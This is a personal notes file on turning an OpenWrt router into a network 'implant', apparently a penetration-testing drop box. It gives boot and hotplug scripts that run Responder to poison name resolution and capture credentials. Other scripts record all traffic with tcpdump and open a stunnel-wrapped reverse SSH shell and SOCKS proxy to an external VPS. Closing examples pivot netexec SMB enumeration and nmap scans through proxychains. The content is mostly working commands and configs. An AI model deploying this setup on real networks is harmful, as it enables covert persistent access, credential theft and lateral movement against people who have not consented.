# Openwrt Implant

The post I used to get the usb drive to behave properly: https://forum.gl-inet.com/t/mifi-install-package-on-external-storage-usb-or-sd-card/4332

- There are still issues here and there, but it works for everything I configured it for.

------

- When installing python to usb, symlink to `/usr/bin/python` via command: `ln -s /mnt/usb/usr/bin/python3 /usr/bin/python`
	- This will let pip work properly instead of returning "command not found" since the package is installed on the usb, but the shebang is set to /usr/bin/python which can be checked via `head -n 1 /mnt/usb/usr/bin/pip`

------

Enable `ipv6` on command line:

```ruby
uci set network.wan6.disabled="0"
uci set network.wan.ipv6="1"

wifi reload                                                                     
service network reload    

uci commit wireless                                                                  
uci commit network
```

For some reason the interface is disabled and it has to be enabled on wan which is pointed to `eth0`

------

To start responder on boot:

```bash
#!/bin/sh  

today=$(date +%m_%d_%Y) 
log="$today"_output.log 

/mnt/sda/usr/bin/python3 -u /mnt/sda/Responder/Responder.py -I eth0 -wF -v >> /mnt/sda/logs/$log 2>&1 &
```

Note: for some reason the Proxy flag makes the database be an annoying little bitch so opted for just `-wF flags`

------

To start tcpdump on boot:

```bash
#!/bin/sh

today=$(date +%y%m%d_%H%M%S)
pcap="$today"_output.pcap

tcpdump -ni eth0 -w /mnt/sda/tcpdump_pcap/$pcap 2>&1 &
```

------

Add to `/etc/hotplug.d/iface/99-ifup-wan`

99-ifup-wan script:

```bash
#!/bin/sh

export USB=/mnt/sda
export PATH=$PATH:$USB/usr/bin:$USB/usr/sbin # This PATH is dependent on existing $PATH
export LD_LIBRARY_PATH=$USB/lib:$USB/usr/lib

uci set network.wan6.disabled="0"
uci set network.wan.ipv6="1"

wifi reload
service network reload

# Sleep for 30 seconds so ipv6 can work properly with responder.
# For some reason ipv6 with Responder on OpenWRT is annoyingly finicky and I wasted too much time to want to touch it anymore.
sleep 30

[ "$ACTION" = "ifup" -a "$INTERFACE" = "wan" ] && {                                                   
        logger "iface wan up detected..."                                                     
        sh /mnt/sda/start_responder.sh
        sh /mnt/sda/start_tcpdump.sh > /dev/null # Output anything to /dev/null
        sh /mnt/sda/start_sshproxy.sh # The ssh reverse dynamic proxy script
}                                                                       
exit 0
```

-------
**NOTE: MAKE SURE TO `chmod +x` ALL THE SCRIPT FILES **

#### Stunnel + SSH:

To install stunnel: `opkg update; opkg install -d usb stunnel`

<u>Stunnel config (implant):</u>

Location: `/mnt/sda/etc/stunnel`

```
output  = /mnt/sda/var/log/stunnel4/stunnel.log
cert    = /mnt/sda/etc/stunnel/stunnel.pem
key     = /mnt/sda/etc/stunnel/stunnel.pem
pid     = /mnt/sda/var/run/stunnel4/stunnel.pid
client  =  yes

[ssh]
accept  = 2223
connect = <vps_ip>:443
```

Have to `mkdir -p /mnt/sda/var/log/stunnel4/` and `mkdir -p /mnt/sda/var/run/stunnel4/`

Symlink `/mnt/sda/etc/stunnel` to `/etc/stunnel` so when we run `/mnt/sda/usr/bin/stunnel` in the script without it bitching about the config file.

Command: `ln -s /mnt/sda/etc/stunnel /etc/stunnel`

<u>SSH Script:</u>

Location: `/mnt/sda/start_sshproxy.sh`

```bash
#!/bin/sh

$USB/usr/bin/stunnel

ssh -N -f -p 2223 root@localhost -R 8081:localhost:22
ssh -N -f -p 2223 root@localhost -R 8081
```


<u>Stunnel config (server):</u>

```
output  = /var/log/stunnel4/stunnel.log
cert    = /etc/stunnel/stunnel.pem
key             = /etc/stunnel/stunnel.pem
pid             = /var/run/stunnel4/stunnel.pid

[ssh]
client = no
accept  = 443
connect = 127.0.0.1:22
```

Have to `mkdir -p /mnt/sda/var/log/stunnel4/` and `mkdir -p /mnt/sda/var/run/stunnel4/`

<u>Stunnel config (pc):</u>

```
output = /var/log/stunnel4/stunnel.log
cert=/etc/stunnel/stunnel.pem
key=/etc/stunnel/stunnel.pem
pid=/var/run/stunnel4/stunnel.pid
client=yes

[ssh]
accept = 2223
connect = <vps_ip>:443
```

SSH Commands:

```
ssh -N -f -p 2223 user@localhost -L 8082:localhost:8081 # To ssh onto implant ssh -p 8082 root@localhost
ssh -N -f -p 2223 user@localhost -L 1081:localhost:1080 # So we can proxy everything might not be needed but I don't care right now
```

Refer to proxychains config and example programs below

------
#### SSH Proxy:

###### <u>On router:</u>

Install the client: `opkg update; opkg install openssh-client`

------

- Only the OpenSSH Client is needed thanks to the implantation of reverse dynamic proxy

```ruby
ssh -N -f -R 1080 user@<vps_host>
```

Script:

```bash
#!/bin/sh

ssh -N -f -R 1080 user@<vps_ip>
```

------

- On the vps make sure to enable ufw and only allow the ssh port.
	- Also configure ssh keys whose public key of router and other computer will need to be added to the authorized_keys

###### <u>On personal computer:</u>

```ruby
ssh -N -f -L 1081:localhost:1080 user@<vps_host>
ssh -N -f -D 1081 localhost
```

Edit proxychains:

```ruby
nano /etc/proxychains.conf

...
socks4 127.0.0.1 <port>
```

------

- Run program through proxychains `proxychains <command> <args>`
###### Examples :

<u>NetExec:</u>

- Wiki: https://www.netexec.wiki/
- Install: https://www.netexec.wiki/getting-started/installation/installation-on-unix

------
Command:

```ruby
sudo proxychains /home/alex/.local/bin/netexec smb <local_ip> -u "user" -p "password" --shares
```

<u>Nmap:</u>

- Have to have `-sT`, `-Pn`, and `-n` flags set

------

Command:

```ruby
sudo proxychains nmap -sT -Pn -n <local_ip_range>
```

------
